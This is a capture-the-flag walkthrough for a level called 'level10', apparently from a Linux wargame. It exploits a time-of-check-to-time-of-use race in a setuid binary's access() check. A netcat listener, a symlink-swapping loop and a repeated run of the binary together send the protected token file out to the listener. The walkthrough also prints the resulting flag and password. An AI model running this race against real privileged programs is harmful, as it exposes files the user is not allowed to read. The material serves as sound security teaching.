

# **Level10**

### **Walk through**

Once again, we have a binary `level10` and a file `token`

`./level10`   
```
$> ./level10 file host  
        sends file to host if you have access to it  
```
We have the same output with `./level10 token`.

`./level10 token 192.168.56.101`  
		`You don't have access to token`

Not so many clues of how to proceed at this point. If we `strings level10` we can read:

```
...
GLIBC_2.4
GLIBC_2.0
PTRh
UWVS
[^_]
%s file host
        sends file to host if you have access to it
Connecting to %s:6969 .. 
Unable to connect to host %s
.*( )*.
Unable to write banner to host %s
Connected!
Sending file .. 
Damn. Unable to open file
Unable to read from file: %s
wrote file!
You don't have access to %s
;*2$"
GCC: (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3
/usr/lib/gcc/i686-linux-gnu/4.6/include
...
```

We see that something is listening on the port **6969**, we also notice that a file (maybe **token**) is sent but can't be read..

`strace ./level10` will give us the list of all system calls:

```
...
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7fdb000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=21440, ...}) = 0
mmap2(NULL, 21440, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7fd5000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/i386-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\226\1\0004\0\0\0"..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1730024, ...}) = 0

...
```

This command gives us precious clues. Indeed, we can notice that there's a call to access and then another one to open. Reading the man of access (*man 2 access*) :

```
Warning:  Using  access()  to  check if a user is authorized to, for example, open a file before actually doing so using open(2) creates a security hole, because the user might exploit the  short  time  interval between  checking  and  opening  the file to manipulate it.  For this reason, the use of this system call should be avoided.  (In the example just described, a safer alternative would be  to  temporarily  switch the process's effective user ID to the real ID and then call open(2).)

access()  always  dereferences  symbolic links.  If you need to check the permissions on a symbolic link, use faccessat(2) with the flag AT_SYMLINK_NOFOLLOW.
```

 In other words, we're facing a [**Time of check to time of use**](https://en.wikipedia.org/wiki/Time-of-check_to_time-of-use). This [**documentation**](https://stackoverflow.com/questions/14333112/access2-system-call-security-issue) gives us more information about that.

What we have to do now is to find a way to exploit that security hole. To do so, we will spam access with a loop. but first, let's open three seperate terminal windows.

In the first:

``nc -lk 6969``

In a second one:

`while true; do ln -s /home/user/level10/token /tmp/link; rm -f /tmp/link; touch /tmp/link; rm -f /tmp/link; done` 

And finally in the third one:

`while true; do ./level10 /tmp/link 192.168.56.101; done`

Looking at the first terminal, we will see the flag : 

```
.*( )*.
.*( )*.
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
.*( )*.
.*( )*.
.*( )*.
.*( )*.
```

Using that flag with `su flag10` and doing `getflag` gives us **`feulo4b72j7edeahuete3no7c`**

We will use it to log as level11

`su level11`
